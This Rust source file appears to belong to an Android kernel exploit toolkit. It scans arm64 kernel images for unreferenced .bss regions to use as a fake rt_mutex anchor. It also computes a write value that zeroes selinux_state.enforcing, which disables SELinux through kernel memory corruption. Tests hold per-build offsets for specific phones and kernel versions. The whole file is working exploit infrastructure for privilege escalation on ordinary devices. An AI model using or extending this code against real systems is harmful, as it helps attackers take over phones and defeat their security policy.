//! Derive `route.select_stack.lock_anchor_*` from a kernel image.
//!
//! The anchor is a zero, writable, reference-free region the PI walk uses as a
//! fake rt_mutex. Three numbers describe it, all per-build: the offset, how
//! many bytes of it are safe to use, and the distance between slots. Today they
//! are hand-picked with two throwaway examples plus human judgement, and the
//! length was wrong once already: the symbol *extent* is 0x1344, the array is
//! one page, and a rotation that trusted the extent walks into
//! `kernfs_pr_cont_buf`, a live printk buffer.
//!
//! The pivot here is that the derivable quantity is not a symbol size -- kallsyms
//! stores none -- but **the longest byte range starting at a candidate that
//! nothing live writes**. That is decidable, it subsumes the size question, and
//! it is self-correcting: extending past the page runs into a live store and
//! stops by construction, naming what stopped it.
//!
//! Design and its limits: docs/analysis/anchor-derivation-plan.md.

use std::collections::{BTreeMap, BTreeSet};

use yaxpeax_arch::{Decoder, Reader, U8Reader};
use yaxpeax_arm::armv8::a64::{InstDecoder, Operand, Opcode, SizeCode};

/// Image-relative section bounds the scan needs. Any of these may be absent on
/// an image that does not carry the symbol, in which case the caller should say
/// so rather than guess.
#[derive(Debug, Default, Clone, Copy)]
pub struct Bounds {
    pub text_start: u64,
    pub text_end: u64,
    /// Init text is freed after boot, so a reference from here executes only
    /// during bring-up. Not disqualifying, but it has to be reported: a store
    /// there leaves the region holding whatever boot left in it.
    pub init_start: u64,
    pub init_end: u64,
    pub bss_start: u64,
    pub bss_end: u64,
    /// Writable-from-boot boundary. A candidate before this is read-only after
    /// init and cannot be used at all.
    pub ro_after_init_end: u64,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    Read,
    Write,
    /// The address is materialised (`adrp` + `add`) but no constant-offset
    /// access follows. It may be compared, or passed to a function, or used as
    /// the base of an indexed access -- the last two touch memory the scanner
    /// cannot see. This is not an access, so it does not bound a prefix, but it
    /// does keep a candidate out of `Safe`.
    Materialize,
}

#[derive(Debug, Clone)]
pub struct Reference {
    pub site: u64,
    pub target: u64,
    pub width: u8,
    pub kind: Kind,
    /// The site is inside init text.
    pub init: bool,
}

impl Reference {
    /// The byte range the access touches.
    pub fn range(&self) -> (u64, u64) {
        (self.target, self.target + self.width as u64)
    }
}

/// Decode the text section and return every direct reference into it.
///
/// "Direct" is the honest qualifier: this follows `adrp` + `add`/`ldr`/`str`,
/// which is how the kernel materialises the address of a .bss static. A store
/// through a pointer obtained some other way -- loaded from a table, built by
/// `movz`/`movk`, handed over by a caller -- is invisible here, which is why the
/// design also scans data sections for literals and why the verdict is
/// three-valued rather than a boolean.
pub fn scan_references(kernel: &[u8], bounds: &Bounds) -> Vec<Reference> {
    let mut refs = Vec::new();
    scan_range(kernel, bounds.text_start, bounds.text_end, bounds, &mut refs);
    /* Init text is freed after boot, but a store there still runs during
     * bring-up; leaving it unscanned made every boot-time registration
     * invisible (the 6.1 anchor scan's 0/0 defect). */
    if bounds.init_end > bounds.init_start {
        scan_range(kernel, bounds.init_start, bounds.init_end, bounds, &mut refs);
    }
    refs
}

fn scan_range(
    kernel: &[u8],
    start: u64,
    end: u64,
    bounds: &Bounds,
    refs: &mut Vec<Reference>,
) {
    let start = start as usize;
    let end = end as usize;
    if end <= start || end > kernel.len() {
        return;
    }

    let decoder = InstDecoder::default();
    let mut reader = U8Reader::new(&kernel[start..end]);
    // Page base last materialised into each register by `adrp`. Cleared as soon
    // as the register is written by anything else, so a stale page can never be
    // attributed to an unrelated access.
    let mut page_of: [Option<u64>; 32] = [None; 32];

    loop {
        let pos = <U8Reader as Reader<u64, u8>>::total_offset(&mut reader) as usize;
        if pos >= end - start {
            break;
        }
        let addr = (start + pos) as u64;
        let Ok(insn) = decoder.decode(&mut reader) else {
            continue;
        };
        let ops = insn.operands;
        match insn.opcode {
            Opcode::ADRP => {
                if let (Some(rd), Operand::PCOffset(imm)) = (reg_of(&ops[0]), &ops[1]) {
                    // adrp target: (pc & !0xfff) + (imm << 12); yaxpeax renders
                    // PCOffset already page-shifted for adrp.
                    let base = (addr & !0xfff) as i64 + *imm;
                    page_of[rd as usize % 32] = Some(base as u64);
                }
                continue;
            }
            Opcode::ADD => {
                // add Rd, Rn, #imm  ->  address of Rn's target + imm.
                // yaxpeax renders both GPR operands as RegisterOrSP for the
                // immediate form, so matching only `Register` meant this arm
                // never ran and every `adrp; add; ldr` access was invisible.
                if let (Some(rd), Some(rn), Operand::Immediate(imm)) =
                    (reg_of(&ops[0]), reg_of(&ops[1]), &ops[2])
                {
                    if let Some(page) = page_of[rn as usize % 32] {
                        let resolved = page.wrapping_add(*imm as u64);
                        page_of[rd as usize % 32] = Some(resolved);
                        /* Record the materialisation even though it is not an
                         * access: it may feed an indexed access or a call,
                         * neither of which this scanner can follow. */
                        refs.push(Reference {
                            site: addr,
                            target: resolved,
                            width: 8,
                            kind: Kind::Materialize,
                            init: in_init(addr, bounds),
                        });
                        continue;
                    }
                }
                clear_dest(&ops, &mut page_of);
                continue;
            }
            Opcode::LDR | Opcode::LDRB | Opcode::LDRH | Opcode::LDRSW => {
                let width = reg_width(&ops[0]).unwrap_or(8);
                if let Some((page, off)) = base_plus_offset(&ops, &page_of) {
                    let target = page.wrapping_add(off);
                    /* The target is a data address, so it is NOT expected to be
                     * inside the text range -- an earlier version filtered on
                     * that and kept only the handful of references pointing back
                     * into text, which is the opposite of what is wanted. */
                    refs.push(Reference {
                        site: addr,
                        target,
                        width,
                        kind: Kind::Read,
                        init: in_init(addr, bounds),
                    });
                }
                if let Some(rd) = reg_of(&ops[0]) {
                    page_of[rd as usize % 32] = None;
                }
                continue;
            }
            Opcode::STR | Opcode::STRB | Opcode::STRH => {
                let width = reg_width(&ops[0]).unwrap_or(8);
                if let Some((page, off)) = base_plus_offset(&ops, &page_of) {
                    let target = page.wrapping_add(off);
                    /* The target is a data address, so it is NOT expected to be
                     * inside the text range -- an earlier version filtered on
                     * that and kept only the handful of references pointing back
                     * into text, which is the opposite of what is wanted. */
                    refs.push(Reference {
                        site: addr,
                        target,
                        width,
                        kind: Kind::Write,
                        init: in_init(addr, bounds),
                    });
                }
                // A store's first operand is a source, not a destination.
                continue;
            }
            Opcode::BL | Opcode::BLR => {
                /* A call clobbers the caller-saved registers; a page base left
                 * in x0..x18 must not be attributed to an access after the
                 * call. Without this, a linear scan reports reads of whatever
                 * the callee's x0 points at as references to the last
                 * materialised .bss page (the 5.10.198 +0x8c false read). */
                for reg in page_of.iter_mut().take(19) {
                    *reg = None;
                }
                continue;
            }
            Opcode::RET | Opcode::BR | Opcode::B => {
                /* Function boundary or unknown target: no register state
                 * survives into the next decoded instruction. */
                page_of = [None; 32];
                continue;
            }
            _ => {
                clear_dest(&ops, &mut page_of);
                continue;
            }
        }
    }
}

/// Register number of a GPR operand. yaxpeax uses `RegisterOrSP` for the
/// immediate forms (`add x9, x9, #0x858`), so both variants have to count.
fn reg_of(op: &Operand) -> Option<u16> {
    match op {
        Operand::Register(_, reg) | Operand::RegisterOrSP(_, reg) => Some(*reg),
        _ => None,
    }
}

/// Access width implied by a register operand.
fn reg_width(op: &Operand) -> Option<u8> {
    match op {
        Operand::Register(code, _) | Operand::RegisterOrSP(code, _) => Some(size_of(*code)),
        _ => None,
    }
}

fn in_init(addr: u64, b: &Bounds) -> bool {
    b.init_end > b.init_start && addr >= b.init_start && addr < b.init_end
}

fn clear_dest(ops: &[Operand; 4], page_of: &mut [Option<u64>; 32]) {
    if let Some(rd) = reg_of(&ops[0]) {
        page_of[rd as usize % 32] = None;
    }
}

/// `[Rn, #off]` with Rn carrying a page base. The immediate-offset form is
/// `RegPreIndex(reg, off, wback)` with the writeback bit clear; the
/// register-indexed forms have no constant offset and are not followed.
fn base_plus_offset(ops: &[Operand; 4], page_of: &[Option<u64>; 32]) -> Option<(u64, u64)> {
    for op in ops.iter() {
        if let Operand::RegPreIndex(rn, off, _) = op {
            if let Some(page) = page_of[*rn as usize % 32] {
                return Some((page, *off as i64 as u64));
            }
        }
    }
    None
}

/// A candidate region: a symbol inside writable .bss, with the extent kallsyms
/// implies (its distance to the next symbol -- an upper bound, not a size).
#[derive(Debug, Clone)]
pub struct Candidate {
    pub name: String,
    pub offset: u64,
    pub extent: u64,
}

pub fn candidates(
    rel: &BTreeMap<String, BTreeSet<u64>>,
    bounds: &Bounds,
    min_extent: u64,
) -> Vec<Candidate> {
    let mut all: Vec<(u64, String)> = Vec::new();
    for (name, offs) in rel {
        for o in offs {
            all.push((*o, name.clone()));
        }
    }
    all.sort();

    let mut out = Vec::new();
    for (i, (off, name)) in all.iter().enumerate() {
        if *off < bounds.bss_start || *off >= bounds.bss_end {
            continue;
        }
        if *off < bounds.ro_after_init_end {
            continue;
        }
        let next = all.get(i + 1).map(|(o, _)| *o).unwrap_or(bounds.bss_end);
        let extent = next.saturating_sub(*off);
        if extent < min_extent {
            continue;
        }
        out.push(Candidate {
            name: name.clone(),
            offset: *off,
            extent,
        });
    }
    out.sort_by(|a, b| b.extent.cmp(&a.extent));
    out
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    /// No live references at all. The only verdict the tool accepts unaided.
    Safe,
    /// Live reads, or a literal pointer into the region. Benign or not is a
    /// judgement, and judgements get surfaced, not made.
    NeedsReview,
    /// A live write.
    Unsafe,
}

impl Verdict {
    pub fn label(self) -> &'static str {
        match self {
            Verdict::Safe => "safe",
            Verdict::NeedsReview => "needs-review",
            Verdict::Unsafe => "unsafe",
        }
    }
}

#[derive(Debug, Clone)]
pub struct Assessment {
    pub candidate: Candidate,
    /// Longest prefix of the candidate that no live write touches and that does
    /// not run into another symbol carrying live references.
    pub safe_len: u64,
    /// Offset, from the candidate's start, of the first live or init read/write
    /// inside its extent. `None` when nothing in the scanned text or init text
    /// touches the candidate. The truly untouched prefix is
    /// `min(safe_len, first_access)`: a read inside a slot makes that slot
    /// unusable just as a write does.
    pub first_access: Option<u64>,
    /// What stopped the extension, in words, for the report.
    pub stopped_by: String,
    pub live_reads: Vec<Reference>,
    pub live_writes: Vec<Reference>,
    /// Address materialisations with no constant-offset access: the candidate
    /// may still be touched through an indexed access or a called function.
    pub materializations: Vec<Reference>,
    pub init_refs: Vec<Reference>,
    pub verdict: Verdict,
}

/// Extend from the candidate's start until something live stands in the way.
pub fn assess(
    cand: &Candidate,
    refs: &[Reference],
    rel: &BTreeMap<String, BTreeSet<u64>>,
    bounds: &Bounds,
) -> Assessment {
    let mut live_reads = Vec::new();
    let mut live_writes = Vec::new();
    let mut materializations = Vec::new();
    let mut init_refs = Vec::new();
    for r in refs {
        if r.target < cand.offset || r.target >= cand.offset + cand.extent {
            continue;
        }
        if r.init {
            init_refs.push(r.clone());
        } else if r.kind == Kind::Write {
            live_writes.push(r.clone());
        } else if r.kind == Kind::Materialize {
            materializations.push(r.clone());
        } else {
            live_reads.push(r.clone());
        }
    }

    // Symbols that start after this one inside its extent: the first that
    // carries any live reference bounds the region, because past it we would be
    // sharing bytes with something the kernel is using.
    let mut blockers: Vec<(u64, String)> = Vec::new();
    for (name, offs) in rel {
        for o in offs {
            if *o > cand.offset && *o < cand.offset + cand.extent {
                let has_live = refs.iter().any(|r| {
                    !r.init && r.target >= *o && r.target < *o + 8
                });
                if has_live || live_writes.iter().any(|w| w.target >= *o) {
                    blockers.push((*o, name.clone()));
                }
            }
        }
    }
    blockers.sort();

    let write_limit = live_writes.iter().map(|w| w.target).min();
    let symbol_limit = blockers.first().map(|(o, _)| *o);
    let mut end = match (write_limit, symbol_limit) {
        (Some(w), Some(s)) => w.min(s),
        (Some(w), None) => w,
        (None, Some(s)) => s,
        (None, None) => cand.offset + cand.extent,
    };
    /* Past the end of .bss the bytes are no longer ours to assume zero, and
     * before `__end_ro_after_init` they are not writable at all. */
    if end > bounds.bss_end {
        end = bounds.bss_end;
    }
    if cand.offset < bounds.ro_after_init_end {
        end = cand.offset;
    }
    let safe_len = end.saturating_sub(cand.offset);

    let stopped_by = if let Some(w) = write_limit {
        if Some(w) == Some(end) {
            format!("live store at +0x{:x}", w)
        } else {
            format!("symbol {:?} at +0x{:x}", blockers[0].1, blockers[0].0)
        }
    } else if let Some((o, name)) = blockers.first() {
        format!("symbol {name:?} at +0x{o:x} carries live references")
    } else {
        "end of the candidate's extent".to_string()
    };

    let verdict = if !live_writes.is_empty() {
        Verdict::Unsafe
    } else if live_reads.is_empty() && materializations.is_empty() {
        Verdict::Safe
    } else {
        Verdict::NeedsReview
    };

    let first_access = live_reads
        .iter()
        .chain(live_writes.iter())
        .chain(init_refs.iter())
        .filter(|r| r.target >= cand.offset && r.target < cand.offset + cand.extent)
        .map(|r| r.target - cand.offset)
        .min();

    Assessment {
        candidate: cand.clone(),
        safe_len,
        first_access,
        stopped_by,
        live_reads,
        live_writes,
        materializations,
        init_refs,
        verdict,
    }
}

/// Register width in bytes -- which is also the access width for a load or a
/// store whose register form determines it.
pub fn size_of(code: SizeCode) -> u8 {
    match code {
        SizeCode::W => 4,
        SizeCode::X => 8,
    }
}

/// Image section bounds, in the same convention `--anchor-scan` uses.
pub fn bounds_from(rel: &BTreeMap<String, BTreeSet<u64>>) -> Bounds {
    let g = |name: &str| -> u64 {
        rel.get(name)
            .and_then(|offs| offs.iter().next().copied())
            .unwrap_or(0)
    };
    Bounds {
        text_start: g("_text"),
        text_end: g("_etext"),
        init_start: g("_sinittext"),
        init_end: g("_einittext"),
        bss_start: g("__bss_start"),
        bss_end: g("__bss_stop"),
        ro_after_init_end: g("__end_ro_after_init"),
    }
}

/// A named symbol's candidate, regardless of the extent filter.
pub fn named_candidate(
    rel: &BTreeMap<String, BTreeSet<u64>>,
    bounds: &Bounds,
    name: &str,
) -> Option<Candidate> {
    let mut all: Vec<(u64, String)> = Vec::new();
    for (symbol, offsets) in rel {
        for offset in offsets {
            all.push((*offset, symbol.clone()));
        }
    }
    all.sort();
    let (index, (offset, _)) = all
        .iter()
        .enumerate()
        .find(|(_, (_, symbol))| symbol == name)?;
    let extent = all
        .get(index + 1)
        .map(|(next, _)| next.saturating_sub(*offset))
        .unwrap_or(bounds.bss_end.saturating_sub(*offset));
    Some(Candidate {
        name: name.to_string(),
        offset: *offset,
        extent,
    })
}

/// Assess one named symbol; `None` when it is not in kallsyms.
pub fn assess_named(
    rel: &BTreeMap<String, BTreeSet<u64>>,
    kernel: &[u8],
    name: &str,
) -> Option<Assessment> {
    let bounds = bounds_from(rel);
    let candidate = named_candidate(rel, &bounds, name)?;
    let refs = scan_references(kernel, &bounds);
    Some(assess(&candidate, &refs, rel, &bounds))
}

/// The result of choosing an anchor. `refused` is a named preference that
/// exists but whose safe prefix cannot hold even one lock slot; the caller
/// must say why it was omitted rather than silently falling back to another
/// region.
#[derive(Debug, Clone)]
pub struct AnchorPick {
    pub selected: Option<Assessment>,
    pub refused: Option<Assessment>,
}

/// Round a safe length down to a whole number of lock slots.
pub fn aligned_bytes(safe_len: u64, stride: u64) -> u64 {
    if stride == 0 {
        0
    } else {
        safe_len - (safe_len % stride)
    }
}

/// The untouched prefix: the smaller of the write-bounded safe length and the
/// first access of any kind (read, write or init), rounded down to whole slots.
/// A read inside a slot makes that slot unusable just as a write does, which is
/// why a candidate is not judged by `safe_len` alone.
pub fn clean_prefix(a: &Assessment, stride: u64) -> u64 {
    let bound = a
        .first_access
        .unwrap_or(a.candidate.extent)
        .min(a.safe_len);
    aligned_bytes(bound, stride)
}

/// The profile triple an assessment can support: `(image offset, bytes, stride)`.
/// `bytes` is the safe prefix rounded down to whole slots; `None` when the
/// prefix cannot hold one.
pub fn profile_triple(a: &Assessment) -> Option<(u64, u64, u64)> {
    let stride = crate::family::ANCHOR_STRIDE;
    let bytes = aligned_bytes(a.safe_len, stride);
    (bytes >= stride).then_some((a.candidate.offset, bytes, stride))
}

/// Where a W1 scratch placement came from, for the fact row.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScratchSource {
    /// The picker found it inside the profile's lock-anchor region.
    Derived,
    /// `--w1-scratch-image`: an operator-supplied image offset.
    OperatorImage,
    /// `--w1-scratch-symbol`: a named second region resolved from kallsyms.
    OperatorSymbol,
    /// The superset's auto policy chain (`options::auto_plan`).
    Policy,
}

impl ScratchSource {
    pub fn label(self) -> &'static str {
        match self {
            ScratchSource::Derived => "disassembly/derived",
            ScratchSource::OperatorImage => "operator-supplied image offset",
            ScratchSource::OperatorSymbol => "operator-supplied symbol",
            ScratchSource::Policy => "policy chain",
        }
    }
}

/// One valid W1 scratch placement.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct W1Scratch {
    /// The scratch's image offset (what the profile's `w1_scratch.image` states).
    pub image: u64,
    /// The region-relative offset of the value the erase writes:
    /// `alias(image) + 0x100 - alias(anchor)`. Zero when the scratch lies
    /// outside the anchor region (there is no region-relative window then).
    pub window: u64,
    /// The allocator slots the collateral window touches (inclusive). Only
    /// meaningful when `inside_anchor`.
    pub reserved_first: u64,
    pub reserved_last: u64,
    pub inside_anchor: bool,
    pub source: ScratchSource,
}

/// Pick where W1's scratch lives inside the named anchor region.
///
/// The value W1 stores is `alias(image) + 0x100`, the same construction as the
/// page value, and three properties must hold:
///
///  * the value's byte 0 is 0 (`selinux_state.enforcing`),
///  * the byte at `initialized_offset` is **odd** -- the kernel compiles the
///    `_Bool` load as `ldarb; tbnz #0` (measured on the diting,
///    2026-10-29 run), so only bit 0 counts,
///  * the 0x18-byte collateral window stays inside the region.
///
/// `phys_delta` is `kernel_phys_load - kernel_phys_offset`; only its low bits
/// matter, and the caller has already checked it is 64 KiB-aligned, which makes
/// the arithmetic a function of the image offset alone. The scan yields exactly
/// 2 reserved slots on the diting: `+0x100` cannot be both aligned to the
/// region grid (0x20) and to the byte-0 requirement, so the window straddles
/// two slots.
pub fn pick_w1_scratch(
    anchor_image: u64,
    anchor_bytes: u64,
    stride: u64,
    phys_delta: u64,
    initialized_offset: u32,
) -> Option<W1Scratch> {
    if stride == 0 || initialized_offset >= 8 {
        return None;
    }
    let base = phys_delta.wrapping_add(anchor_image);
    /* (base + s + 0x100) & 0xff == 0  =>  s == (-base) mod 0x100. */
    let mut s = (0u64.wrapping_sub(base)) & 0xff;
    loop {
        if s + 0x100 + 0x18 > anchor_bytes {
            return None;
        }
        let value = base.wrapping_add(s).wrapping_add(0x100);
        let byte = (value >> (8 * initialized_offset)) & 0xff;
        if byte & 1 == 1 {
            let window = s + 0x100;
            return Some(W1Scratch {
                image: anchor_image + s,
                window,
                reserved_first: window / stride,
                reserved_last: (window + 0x17) / stride,
                inside_anchor: true,
                source: ScratchSource::Derived,
            });
        }
        s += 0x100;
    }
}

/// Validate an operator-supplied scratch image offset (`--w1-scratch-image`).
///
/// The same predicate as the derived picker -- byte 0 of the value is 0 and
/// the `initialized` byte is odd -- plus the reservation rule: a scratch inside
/// the anchor region must keep its 0x18-byte window inside the region, and a
/// scratch outside it reserves nothing (the named region is the operator's
/// safety claim, and the window is not part of the lock grid).
pub fn pick_w1_scratch_at(
    image: u64,
    anchor_image: u64,
    anchor_bytes: u64,
    stride: u64,
    phys_delta: u64,
    initialized_offset: u32,
) -> Option<W1Scratch> {
    if stride == 0 || initialized_offset >= 8 {
        return None;
    }
    let value = phys_delta.wrapping_add(image).wrapping_add(0x100);
    if value & 0xff != 0 {
        return None;
    }
    if ((value >> (8 * initialized_offset)) & 0xff) & 1 == 0 {
        return None;
    }
    let inside = image >= anchor_image && image < anchor_image.checked_add(anchor_bytes)?;
    if inside {
        let window = image - anchor_image + 0x100;
        if window + 0x18 > anchor_bytes {
            return None;
        }
        Some(W1Scratch {
            image,
            window,
            reserved_first: window / stride,
            reserved_last: (window + 0x17) / stride,
            inside_anchor: true,
            source: ScratchSource::OperatorImage,
        })
    } else {
        Some(W1Scratch {
            image,
            window: 0,
            reserved_first: 0,
            reserved_last: 0,
            inside_anchor: false,
            source: ScratchSource::OperatorImage,
        })
    }
}

/// Pick a window inside a named second region (`--w1-scratch-symbol`).
///
/// `offset` is the symbol's image offset and `extent` its span to the next
/// symbol. Windows are tried on the byte-0 residue, 0x100 apart. A window
/// inside the image file must be all zero; a window past the file is BSS
/// (zero at boot by definition, and the runtime zero is the device/QEMU
/// witness, not the tool's claim) and is accepted.
pub fn pick_w1_scratch_in_symbol(
    offset: u64,
    extent: u64,
    kernel: &[u8],
    phys_delta: u64,
    initialized_offset: u32,
) -> Option<W1Scratch> {
    if initialized_offset >= 8 || extent < 0x118 {
        return None;
    }
    let base = phys_delta.wrapping_add(offset);
    let mut s = (0u64.wrapping_sub(base)) & 0xff;
    loop {
        if s + 0x100 + 0x18 > extent {
            return None;
        }
        let value = base.wrapping_add(s).wrapping_add(0x100);
        if value & 0xff == 0 && ((value >> (8 * initialized_offset)) & 0xff) & 1 == 1 {
            let image = offset + s;
            let win = image + 0x100;
            let in_file = (win as usize)
                .checked_add(0x18)
                .is_some_and(|end| end <= kernel.len());
            if in_file {
                let bytes = &kernel[win as usize..win as usize + 0x18];
                if bytes.iter().any(|b| *b != 0) {
                    s += 0x100;
                    continue;
                }
            }
            return Some(W1Scratch {
                image,
                window: 0,
                reserved_first: 0,
                reserved_last: 0,
                inside_anchor: false,
                source: ScratchSource::OperatorSymbol,
            });
        }
        s += 0x100;
    }
}

/// Pick the region a generated profile should carry: the first named
/// preference that exists and whose safe prefix holds at least one slot.
///
/// There is deliberately **no ranked fallback**: the scanner's `safe` verdict
/// is not proof — `__log_buf` scores as `safe` (0 direct references) yet
/// printk writes it through indexes the scan cannot see, and it would win a
/// `max_by_key(safe_len)` race. An anchor the operator did not accept may
/// corrupt live kernel data; a build whose symbol set moved gets the warning
/// and the page path, or an operator-supplied triple.
///
/// The named path judges the **prefix**, not the whole symbol: a live store
/// past the prefix never reaches the slots the anchor writes (5.10.198's
/// `dump_skip.zeroes` has a store at +0x810 and a 0x800 usable prefix). The
/// whole-symbol verdict is still reported, and a prefix shorter than one slot
/// is refused (the next name in the list is still tried).
pub fn select_candidate(
    kernel: &[u8],
    rel: &BTreeMap<String, BTreeSet<u64>>,
    prefer: &[&str],
) -> AnchorPick {
    let bounds = bounds_from(rel);
    let refs = scan_references(kernel, &bounds);
    let mut refused = None;
    for name in prefer {
        let Some(candidate) = named_candidate(rel, &bounds, name) else {
            continue;
        };
        let assessment = assess(&candidate, &refs, rel, &bounds);
        if profile_triple(&assessment).is_some() {
            return AnchorPick {
                selected: Some(assessment),
                refused: None,
            };
        }
        refused.get_or_insert(assessment);
    }
    AnchorPick {
        selected: None,
        refused,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assessment(safe_len: u64, verdict: Verdict) -> Assessment {
        Assessment {
            candidate: Candidate {
                name: "dump_skip.zeroes".to_string(),
                offset: 0x2eac808,
                extent: 0x1000,
            },
            safe_len,
            first_access: None,
            stopped_by: "live store at +0x810".to_string(),
            live_reads: Vec::new(),
            live_writes: Vec::new(),
            materializations: Vec::new(),
            init_refs: Vec::new(),
            verdict,
        }
    }

    /// adrp x9, page; add x9, x9, #imm; ldr x0, [x9] -- the sequence whose `add`
    /// yaxpeax renders with `RegisterOrSP` operands.
    fn adrp_add_ldr(page: u32, low: u32) -> Vec<u8> {
        let immlo = (page >> 12) & 3;
        let immhi = (page >> 14) & 0x7ffff;
        let adrp = 0x9000_0000 | (immlo << 29) | (immhi << 5) | 9;
        let add = 0x9100_0000 | (low << 10) | (9 << 5) | 9;
        let ldr = 0xf940_0000 | (9 << 5);
        [adrp, add, ldr]
            .iter()
            .flat_map(|word| word.to_le_bytes())
            .collect()
    }

    fn bounds(text_start: u64, text_end: u64, init_start: u64, init_end: u64) -> Bounds {
        Bounds {
            text_start,
            text_end,
            init_start,
            init_end,
            bss_start: 0,
            bss_end: 0,
            ro_after_init_end: 0,
        }
    }

    #[test]
    fn scanner_follows_add_through_register_or_sp() {
        let kernel = adrp_add_ldr(0x1000, 0x10);
        let refs = scan_references(&kernel, &bounds(0, 12, 0, 0));
        assert!(
            refs.iter()
                .any(|r| r.target == 0x1010 && r.kind == Kind::Read),
            "adrp+add+ldr produced no read at 0x1010: {refs:?}"
        );
    }

    #[test]
    fn scanner_reaches_init_text_and_marks_it() {
        let kernel = adrp_add_ldr(0x1000, 0x20);
        let refs = scan_references(&kernel, &bounds(0, 0, 0, 12));
        assert!(
            refs.iter().any(|r| r.target == 0x1020 && r.init),
            "init-text access missing or not marked: {refs:?}"
        );
    }

    #[test]
    fn clean_prefix_stops_at_the_first_read() {
        let mut a = assessment(0x1000, Verdict::NeedsReview);
        a.first_access = Some(0xa70);
        assert_eq!(clean_prefix(&a, 0x20), 0xa60);
    }

    #[test]
    fn aligned_bytes_rounds_down_to_whole_slots() {
        assert_eq!(aligned_bytes(0x810, 0x20), 0x800);
        assert_eq!(aligned_bytes(0x1000, 0x20), 0x1000);
        assert_eq!(aligned_bytes(0x1f, 0x20), 0);
    }

    #[test]
    fn profile_triple_uses_the_safe_prefix_of_an_unsafe_symbol() {
        let a = assessment(0x810, Verdict::Unsafe);
        assert_eq!(profile_triple(&a), Some((0x2eac808, 0x800, 0x20)));
    }

    #[test]
    fn profile_triple_refuses_a_prefix_shorter_than_one_slot() {
        let a = assessment(0x1f, Verdict::Unsafe);
        assert_eq!(profile_triple(&a), None);
    }

    /* ---- W1 scratch slot (page-free Stage 1) ---------------------------- */

    #[test]
    fn diting_scratch_lands_on_the_odd_byte_and_reserves_two_slots() {
        /* The diting: anchor +0x2a3a590 (alias low byte 0x90), delta 0x28000000,
         * initialized at byte 2, 0x1000 bytes at stride 0x20. */
        let pick = pick_w1_scratch(0x2a3a590, 0x1000, 0x20, 0x28000000, 2).unwrap();
        assert_eq!(pick.image, 0x2a3a600, "image offset (anchor + 0x70)");
        assert_eq!(pick.window, 0x170, "value window inside the region");
        assert_eq!((pick.reserved_first, pick.reserved_last), (11, 12));
        let value = 0x28000000u64 + pick.image + 0x100;
        assert_eq!(value & 0xff, 0, "byte 0 (enforcing) is zero");
        assert_eq!((value >> 16) & 1, 1, "initialized byte (2) is odd");
    }

    #[test]
    fn scratch_fails_closed_when_the_region_cannot_satisfy_the_byte() {
        /* 5.10-style (initialized at byte 2): the region's value byte 2 is a
         * property of the region, so a region whose value byte 2 is even has
         * no valid slot and the picker refuses. */
        assert_eq!(pick_w1_scratch(0x2000000, 0x1000, 0x20, 0, 2), None);
    }

    #[test]
    fn six_six_scratch_uses_an_odd_byte_one() {
        /* 6.6-style (initialized at byte 1): the CPH2723's anchor/image
         * numbers; whatever slot is chosen, the value's byte 1 must be odd. */
        let pick = pick_w1_scratch(0x23019c8, 0x1000, 0x20, 0x28000000, 1).unwrap();
        let value = 0x28000000u64 + pick.image + 0x100;
        assert_eq!(value & 0xff, 0, "byte 0 (enforcing) is zero");
        assert_eq!((value >> 8) & 1, 1, "initialized byte (1) is odd");
        assert!(pick.window + 0x18 <= 0x1000);
    }

    #[test]
    fn scratch_is_refused_when_no_window_fits() {
        assert_eq!(pick_w1_scratch(0x2a3a590, 0x100, 0x20, 0x28000000, 2), None);
        assert_eq!(pick_w1_scratch(0x2a3a590, 0x117, 0x20, 0x28000000, 2), None);
    }

    #[test]
    fn scratch_window_stays_inside_the_region() {
        let pick = pick_w1_scratch(0x2a3a590, 0x1000, 0x20, 0x28000000, 2).unwrap();
        assert!(pick.window + 0x18 <= 0x1000);
        assert!(pick.reserved_last < 0x1000 / 0x20);
    }

    /* ---- second-region / operator scratch (Stage 4) -------------------- */

    #[test]
    fn operator_image_inside_the_anchor_reserves_slots() {
        let pick =
            pick_w1_scratch_at(0x2a3a600, 0x2a3a590, 0x1000, 0x20, 0x28000000, 2).unwrap();
        assert!(pick.inside_anchor);
        assert_eq!(pick.source, ScratchSource::OperatorImage);
        assert_eq!((pick.reserved_first, pick.reserved_last), (11, 12));
    }

    #[test]
    fn operator_image_outside_the_anchor_reserves_nothing() {
        /* 5.10.177's bm_pmd scratch: outside the sigreturn anchor. */
        let pick =
            pick_w1_scratch_at(0x297a000, 0x2a27598, 0x1000, 0x20, 0x28000000, 2).unwrap();
        assert!(!pick.inside_anchor);
        assert_eq!((pick.reserved_first, pick.reserved_last), (0, 0));
    }

    #[test]
    fn operator_image_rejects_a_bad_value() {
        /* byte 0 is not 0 */
        assert_eq!(
            pick_w1_scratch_at(0x297a001, 0x2a27598, 0x1000, 0x20, 0x28000000, 2),
            None
        );
        /* byte 2 even (bm_pmd on 5.10.101) */
        assert_eq!(
            pick_w1_scratch_at(0x2960000, 0x2a27598, 0x1000, 0x20, 0x28000000, 2),
            None
        );
    }

    #[test]
    fn symbol_pick_skips_a_nonzero_window() {
        /* A .data-like region: the first residue window is non-zero, the next
         * (0x100 later) is zero; the picker must move past the first. */
        let mut kernel = vec![0u8; 0x10300];
        kernel[0x10100] = 1;
        let pick = pick_w1_scratch_in_symbol(0x10000, 0x300, &kernel, 0, 2).unwrap();
        assert_eq!(pick.image, 0x10100);
        assert_eq!(pick.source, ScratchSource::OperatorSymbol);
        assert!(!pick.inside_anchor);
    }

    #[test]
    fn symbol_pick_accepts_a_bss_window_past_the_file() {
        /* bm_pmd on the 6.1.138 layout: the file ends before the bss, so the
         * window is not in it; the pick lands on the symbol base. */
        let pick = pick_w1_scratch_in_symbol(0x21d1000, 0x1000, &[], 0x28000000, 2).unwrap();
        assert_eq!(pick.image, 0x21d1000);
        /* serial8250_ports on 6.1.25: the residue puts the window at +0x150. */
        let pick = pick_w1_scratch_in_symbol(0x20b93b0, 0x6a00, &[], 0x28000000, 2).unwrap();
        assert_eq!(pick.image, 0x20b9400);
    }

    #[test]
    fn symbol_pick_refuses_a_short_region() {
        assert_eq!(pick_w1_scratch_in_symbol(0x10000, 0x100, &[], 0, 2), None);
    }
}
